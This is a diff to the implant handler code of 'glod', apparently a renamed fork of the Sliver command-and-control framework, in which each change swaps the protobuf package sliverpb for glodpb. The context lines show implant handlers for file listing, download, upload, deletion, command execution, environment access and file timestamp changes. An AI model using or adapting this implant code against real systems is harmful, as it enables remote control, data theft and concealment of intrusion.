@@ -40,7 +40,7 @@ import (
 	"github.com/starkzarn/glod/implant/sliver/handlers/matcher"
 	"github.com/starkzarn/glod/implant/sliver/transports"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -54,13 +54,13 @@ type RPCHandler func([]byte, RPCResponse)
 type SpecialHandler func([]byte, *transports.Connection) error
 
 // TunnelHandler - Tunnel related functionality for duplex connections
-type TunnelHandler func(*sliverpb.Envelope, *transports.Connection)
+type TunnelHandler func(*glodpb.Envelope, *transports.Connection)
 
 // PivotHandler - Handler related to pivoting
-type PivotHandler func(*sliverpb.Envelope, *transports.Connection)
+type PivotHandler func(*glodpb.Envelope, *transports.Connection)
 
 // RportFwdHandler - Handler related to reverse port forwarding
-type RportFwdHandler func(*sliverpb.Envelope, *transports.Connection)
+type RportFwdHandler func(*glodpb.Envelope, *transports.Connection)
 
 // -----------------------------------------------------
 // -----------------------------------------------------
@@ -71,7 +71,7 @@ type RportFwdHandler func(*sliverpb.Envelope, *transports.Connection)
 // -----------------------------------------------------
 
 func pingHandler(data []byte, resp RPCResponse) {
-	ping := &sliverpb.Ping{}
+	ping := &glodpb.Ping{}
 	err := proto.Unmarshal(data, ping)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -139,7 +139,7 @@ func pathIsDirectory(path string) bool {
 }
 
 func dirListHandler(data []byte, resp RPCResponse) {
-	dirListReq := &sliverpb.LsReq{}
+	dirListReq := &glodpb.LsReq{}
 	err := proto.Unmarshal(data, dirListReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -163,13 +163,13 @@ func dirListHandler(data []byte, resp RPCResponse) {
 
 	// Convert directory listing to protobuf
 	timezone, offset := time.Now().Zone()
-	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
+	dirList := &glodpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
 	if err == nil {
 		dirList.Exists = true
 	} else {
 		dirList.Exists = false
 	}
-	dirList.Files = []*sliverpb.FileInfo{}
+	dirList.Files = []*glodpb.FileInfo{}
 
 	var match bool = false
 	var linkPath string = ""
@@ -188,7 +188,7 @@ func dirListHandler(data []byte, resp RPCResponse) {
 
 		if match {
 			fileInfo, err := dirEntry.Info()
-			sliverFileInfo := &sliverpb.FileInfo{}
+			sliverFileInfo := &glodpb.FileInfo{}
 			if err == nil {
 				sliverFileInfo.Size = fileInfo.Size()
 				sliverFileInfo.ModTime = fileInfo.ModTime().Unix()
@@ -246,7 +246,7 @@ func getDirList(target string) (string, []fs.DirEntry, error) {
 }
 
 func rmHandler(data []byte, resp RPCResponse) {
-	rmReq := &sliverpb.RmReq{}
+	rmReq := &glodpb.RmReq{}
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -255,7 +255,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	rm := &sliverpb.Rm{}
+	rm := &glodpb.Rm{}
 	target, _ := filepath.Abs(rmReq.Path)
 	rm.Path = target
 	_, err = os.Stat(target)
@@ -287,7 +287,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 }
 
 func mvHandler(data []byte, resp RPCResponse) {
-	mvReq := &sliverpb.MvReq{}
+	mvReq := &glodpb.MvReq{}
 	err := proto.Unmarshal(data, mvReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -296,7 +296,7 @@ func mvHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	move := &sliverpb.Mv{}
+	move := &glodpb.Mv{}
 	err = os.Rename(mvReq.Src, mvReq.Dst)
 	if err != nil {
 		move.Response = &commonpb.Response{
@@ -309,7 +309,7 @@ func mvHandler(data []byte, resp RPCResponse) {
 }
 
 func mkdirHandler(data []byte, resp RPCResponse) {
-	mkdirReq := &sliverpb.MkdirReq{}
+	mkdirReq := &glodpb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -318,7 +318,7 @@ func mkdirHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	mkdir := &sliverpb.Mkdir{}
+	mkdir := &glodpb.Mkdir{}
 	target, _ := filepath.Abs(mkdirReq.Path)
 	mkdir.Path = target
 
@@ -333,7 +333,7 @@ func mkdirHandler(data []byte, resp RPCResponse) {
 }
 
 func cdHandler(data []byte, resp RPCResponse) {
-	cdReq := &sliverpb.CdReq{}
+	cdReq := &glodpb.CdReq{}
 	err := proto.Unmarshal(data, cdReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -345,7 +345,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 
 	os.Chdir(cdReq.Path)
 	dir, err := os.Getwd()
-	pwd := &sliverpb.Pwd{Path: dir}
+	pwd := &glodpb.Pwd{Path: dir}
 	if err != nil {
 		resp([]byte{}, err)
 		return
@@ -360,7 +360,7 @@ func cdHandler(data []byte, resp RPCResponse) {
 }
 
 func pwdHandler(data []byte, resp RPCResponse) {
-	pwdReq := &sliverpb.PwdReq{}
+	pwdReq := &glodpb.PwdReq{}
 	err := proto.Unmarshal(data, pwdReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -371,7 +371,7 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	}
 
 	dir, err := os.Getwd()
-	pwd := &sliverpb.Pwd{Path: dir}
+	pwd := &glodpb.Pwd{Path: dir}
 	if err != nil {
 		pwd.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -418,9 +418,9 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	*/
 	var isDir bool
 
-	var download *sliverpb.Download
+	var download *glodpb.Download
 
-	downloadReq := &sliverpb.DownloadReq{}
+	downloadReq := &glodpb.DownloadReq{}
 	err := proto.Unmarshal(data, downloadReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -450,14 +450,14 @@ func downloadHandler(data []byte, resp RPCResponse) {
 			log.Printf("error while preparing download for %s: %v", target, err)
 			//{{end}}
 		}
-		download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
+		download = &glodpb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
 		download.Response = &commonpb.Response{
 			Err: fmt.Sprintf("%v", err),
 		}
 	} else {
 		gzipData := bytes.NewBuffer([]byte{})
 		gzipWrite(gzipData, rawData)
-		download = &sliverpb.Download{
+		download = &glodpb.Download{
 			Path:            target,
 			Data:            gzipData.Bytes(),
 			Encoder:         "gzip",
@@ -474,7 +474,7 @@ func downloadHandler(data []byte, resp RPCResponse) {
 }
 
 func uploadHandler(data []byte, resp RPCResponse) {
-	uploadReq := &sliverpb.UploadReq{}
+	uploadReq := &glodpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -493,7 +493,7 @@ func uploadHandler(data []byte, resp RPCResponse) {
 	}
 
 	// Process Upload
-	upload := &sliverpb.Upload{Path: uploadPath}
+	upload := &glodpb.Upload{Path: uploadPath}
 
 	f, err := os.Create(uploadPath)
 	if err != nil {
@@ -533,7 +533,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 		errWriter *bufio.Writer
 		outWriter *bufio.Writer
 	)
-	execReq := &sliverpb.ExecuteReq{}
+	execReq := &glodpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -542,7 +542,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	execResp := &sliverpb.Execute{}
+	execResp := &glodpb.Execute{}
 	exePath, err := expandPath(execReq.Path)
 	if err != nil {
 		execResp.Response = &commonpb.Response{
@@ -635,7 +635,7 @@ func executeHandler(data []byte, resp RPCResponse) {
 }
 
 func getEnvHandler(data []byte, resp RPCResponse) {
-	envReq := &sliverpb.EnvReq{}
+	envReq := &glodpb.EnvReq{}
 	err := proto.Unmarshal(data, envReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -645,7 +645,7 @@ func getEnvHandler(data []byte, resp RPCResponse) {
 	}
 	variables := os.Environ()
 	var envVars []*commonpb.EnvVar
-	envInfo := sliverpb.EnvInfo{}
+	envInfo := glodpb.EnvInfo{}
 	if envReq.Name != "" {
 		envVars = make([]*commonpb.EnvVar, 1)
 		envVars[0] = &commonpb.EnvVar{
@@ -668,7 +668,7 @@ func getEnvHandler(data []byte, resp RPCResponse) {
 }
 
 func setEnvHandler(data []byte, resp RPCResponse) {
-	envReq := &sliverpb.SetEnvReq{}
+	envReq := &glodpb.SetEnvReq{}
 	err := proto.Unmarshal(data, envReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -678,7 +678,7 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 	}
 
 	err = os.Setenv(envReq.Variable.Key, envReq.Variable.Value)
-	setEnvResp := &sliverpb.SetEnv{
+	setEnvResp := &glodpb.SetEnv{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -689,7 +689,7 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 }
 
 func unsetEnvHandler(data []byte, resp RPCResponse) {
-	unsetEnvReq := &sliverpb.UnsetEnvReq{}
+	unsetEnvReq := &glodpb.UnsetEnvReq{}
 	err := proto.Unmarshal(data, unsetEnvReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -699,7 +699,7 @@ func unsetEnvHandler(data []byte, resp RPCResponse) {
 	}
 
 	err = os.Unsetenv(unsetEnvReq.Name)
-	unsetEnvResp := &sliverpb.UnsetEnv{
+	unsetEnvResp := &glodpb.UnsetEnv{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -710,7 +710,7 @@ func unsetEnvHandler(data []byte, resp RPCResponse) {
 }
 
 func reconfigureHandler(data []byte, resp RPCResponse) {
-	reconfigReq := &sliverpb.ReconfigureReq{}
+	reconfigReq := &glodpb.ReconfigureReq{}
 	err := proto.Unmarshal(data, reconfigReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -731,7 +731,7 @@ func reconfigureHandler(data []byte, resp RPCResponse) {
 	}
 	// {{end}}
 
-	reconfigResp := &sliverpb.Reconfigure{}
+	reconfigResp := &glodpb.Reconfigure{}
 	data, err = proto.Marshal(reconfigResp)
 	resp(data, err)
 }
@@ -968,7 +968,7 @@ func expandPath(exePath string) (string, error) {
 }
 
 func chtimesHandler(data []byte, resp RPCResponse) {
-	chtimesReq := &sliverpb.ChtimesReq{}
+	chtimesReq := &glodpb.ChtimesReq{}
 	err := proto.Unmarshal(data, chtimesReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -977,7 +977,7 @@ func chtimesHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	chtimes := &sliverpb.Chtimes{}
+	chtimes := &glodpb.Chtimes{}
 	target, _ := filepath.Abs(chtimesReq.Path)
 	chtimes.Path = target
 	// Make sure file exists
